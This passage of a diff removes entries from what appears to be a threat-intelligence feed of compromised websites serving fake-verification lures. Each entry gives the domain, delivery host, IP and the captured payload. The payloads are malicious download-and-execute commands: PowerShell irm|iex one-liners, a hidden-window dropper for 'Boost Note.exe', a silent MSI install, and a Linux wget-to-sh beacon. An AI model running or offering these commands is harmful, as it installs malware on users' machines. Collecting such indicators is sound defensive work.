-      "104.21.83.114"
-    ],
-    "Related": [
-      {
-        "Value": "https://wa.me/5521964564170?text=ol%c3%a1,%20gostaria%20de%20mais%20informa%c3%a7%c3%b5es",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "(irm 'https://github[.]pw/Girya/ba63cf9b5b2960f2')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/ba63cf9b5b2960f2"
-    ],
-    "ReportId": "cmwe7mdx0089s0omlm72xj8s5",
-    "ScannedAt": "2026-11-12T23:59:32.899000+00:00"
-  },
-  {
-    "UrlDomain": "mstannyenglish.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/14683ec92db74be1"
-    ],
-    "IP": [
-      "103.82.26.141"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/14683ec92db74be1')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/14683ec92db74be1"
-    ],
-    "ReportId": "cmwe7hwv4086g0oml2orik1md",
-    "ScannedAt": "2026-11-12T23:56:04.156000+00:00"
-  },
-  {
-    "UrlDomain": "kusadasimedya.com.tr",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "172.67.128.234"
-    ],
-    "Related": [
-      {
-        "Value": "https://frclau.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwe7bryf083t0oml8z2ibumi",
-    "ScannedAt": "2026-11-12T23:51:17.860000+00:00"
-  },
-  {
-    "UrlDomain": "imisayurveda.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/50f3987165a83e1e"
-    ],
-    "IP": [
-      "160.153.0.117"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/50f3987165a83e1e')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/50f3987165a83e1e"
-    ],
-    "ReportId": "cmwe7b7wf082h0omlg6jyyk5k",
-    "ScannedAt": "2026-11-12T23:50:51.864000+00:00"
-  },
-  {
-    "UrlDomain": "scale2dach.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/5ca930081e6a975a"
-    ],
-    "IP": [
-      "68.210.171.1"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/5ca930081e6a975a')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/5ca930081e6a975a"
-    ],
-    "ReportId": "cmwe7ahpk081t0oml3caic0vl",
-    "ScannedAt": "2026-11-12T23:50:17.931000+00:00"
-  },
-  {
-    "UrlDomain": "bakirkoytasimacilik.cyou",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "172.67.211.146"
-    ],
-    "Related": [
-      {
-        "Value": "https://frclau.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwe7a1hu080y0omlm1sm6qb3",
-    "ScannedAt": "2026-11-12T23:49:56.888000+00:00"
-  },
-  {
-    "UrlDomain": "decoupageguild.co.uk",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "104.21.89.54"
-    ],
-    "Related": [
-      {
-        "Value": "https://frclau.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwe79ylx08080oml5k4dzonu",
-    "ScannedAt": "2026-11-12T23:49:53.136000+00:00"
-  },
-  {
-    "UrlDomain": "agriviterbo.it",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "185.205.40.139"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/875877f7d9ba3a9c",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=b750113eb31831f3b88a6cc0a3409e632817c51274b6cb24&amp;_v=29908767",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/875877f7d9ba3a9c'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/875877f7d9ba3a9c"
-    ],
-    "ReportId": "cmwe6hbwc07yn0omlw3oayuj0",
-    "ScannedAt": "2026-11-12T23:27:37.392000+00:00"
-  },
-  {
-    "UrlDomain": "www.bellattitude.fr",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "79.137.100.252"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/63534eff5860c270",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/63534eff5860c270'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/63534eff5860c270"
-    ],
-    "ReportId": "cmwe6gq6107wg0omlybspancs",
-    "ScannedAt": "2026-11-12T23:27:09.230000+00:00"
-  },
-  {
-    "UrlDomain": "www.bibleword.org",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "158.69.54.116"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/62f2ca8cc1e23e58",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&amp;_v=29908766",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/62f2ca8cc1e23e58'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/62f2ca8cc1e23e58"
-    ],
-    "ReportId": "cmwe6gq1a07wf0oml6ikm3qdf",
-    "ScannedAt": "2026-11-12T23:27:09.068000+00:00"
-  },
-  {
-    "UrlDomain": "www.arqing.studio",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "128.65.195.152"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/32e494b8378e3441",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29908766",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/32e494b8378e3441'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/32e494b8378e3441"
-    ],
-    "ReportId": "cmwe6g6ux07v90omlmjyd5njj",
-    "ScannedAt": "2026-11-12T23:26:44.215000+00:00"
-  },
-  {
-    "UrlDomain": "www.3essecorporationsrl.it",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.110.59"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/df566b6947c2c0cc",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29908766",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/df566b6947c2c0cc'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/df566b6947c2c0cc"
-    ],
-    "ReportId": "cmwe6fyao07uc0omlffcs2zxu",
-    "ScannedAt": "2026-11-12T23:26:33.055000+00:00"
-  },
-  {
-    "UrlDomain": "aoc.com.hk",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "23.94.205.213"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/404f8b939dce2afe",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=b9bb78ea241a8255eb076ae3d4aa6dc13e3b84ccbf21041c&amp;_v=29908765",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/404f8b939dce2afe'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/404f8b939dce2afe"
-    ],
-    "ReportId": "cmwe6fee907sw0omlo51w7jwd",
-    "ScannedAt": "2026-11-12T23:26:07.297000+00:00"
-  },
-  {
-    "UrlDomain": "airdrieblackcommunity.ca",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "74.208.236.245"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/e0d5e1e484132468",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/e0d5e1e484132468'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/e0d5e1e484132468"
-    ],
-    "ReportId": "cmwe6fcn507sm0oml7vikiuxv",
-    "ScannedAt": "2026-11-12T23:26:05.045000+00:00"
-  },
-  {
-    "UrlDomain": "astrohubpro.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "212.85.28.96"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/30a71a2fdd245a54",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/30a71a2fdd245a54'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/30a71a2fdd245a54"
-    ],
-    "ReportId": "cmwe6ekob07rq0oml58sh6rrw",
-    "ScannedAt": "2026-11-12T23:25:28.631000+00:00"
-  },
-  {
-    "UrlDomain": "avalonappraisalservices.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "104.21.95.47"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/4b7ddb4fc39a9ff3",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=46ce550b5f1e14a4a0e04918d929c3cc85b3683eb82f776e&amp;_v=29908764",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=46ce550b5f1e14a4a0e04918d929c3cc85b3683eb82f776e&_v=29908764",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/4b7ddb4fc39a9ff3'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/4b7ddb4fc39a9ff3"
-    ],
-    "ReportId": "cmwe6egab07r40omlaykrxwjj",
-    "ScannedAt": "2026-11-12T23:25:23.097000+00:00"
-  },
-  {
-    "UrlDomain": "cctvkarawang.id",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/133f5f853512bcb5",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/133f5f853512bcb5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/133f5f853512bcb5"
-    ],
-    "ReportId": "cmwe44dci07q70oml07jgqg17",
-    "ScannedAt": "2026-11-12T22:21:33.518000+00:00"
-  },
-  {
-    "UrlDomain": "reneesolomon.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "modestknollpartners.com",
-      "quietshalecompany.com",
-      "simplecopseholding.com",
-      "promiseallrace.com",
-      "generatoryieldlab.com",
-      "script-six-tawny.vercel.app",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "141.193.213.11"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=ce23b1b3-0f76-4be3-b79a-d8fc0016875a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Freneesolomon[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-12T19%3A59%3A11.299Z&lastShellAt=2026-11-12T19%3A59%3A11.299Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwdz32o206wn0omluye82wa5",
-    "ScannedAt": "2026-11-12T20:00:34.925000+00:00"
-  },
-  {
-    "UrlDomain": "dentoessencern.com.br",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "195.200.3.243"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/b95d7a7582b4477e",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29908557",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/b95d7a7582b4477e'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/b95d7a7582b4477e"
-    ],
-    "ReportId": "cmwdyzawy06vv0omlgusub5ga",
-    "ScannedAt": "2026-11-12T19:57:38.952000+00:00"
-  },
-  {
-    "UrlDomain": "floripaprimetravel.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "192.185.208.37"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801"
-    ],
-    "ReportId": "cmwdxprc105rj0omlyy2rxdia",
-    "ScannedAt": "2026-11-12T19:22:14.096000+00:00"
-  },
-  {
-    "UrlDomain": "newwaymedia.de",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "81.169.145.175"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwdxp8ne05qu0omlyd8d0l2n",
-    "ScannedAt": "2026-11-12T19:21:49.887000+00:00"
-  },
-  {
-    "UrlDomain": "dawnconcepts.co.za",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "129.232.249.216"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwdvqh69058b0omlf4jk9bme",
-    "ScannedAt": "2026-11-12T18:26:48.346000+00:00"
-  },
-  {
-    "UrlDomain": "ctribhovandas.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.85.104"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/fe2aab3b32968bba",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/fe2aab3b32968bba"
-    ],
-    "ReportId": "cmwduvxv605530oml8atdneps",
-    "ScannedAt": "2026-11-12T18:03:03.530000+00:00"
   }
 ]
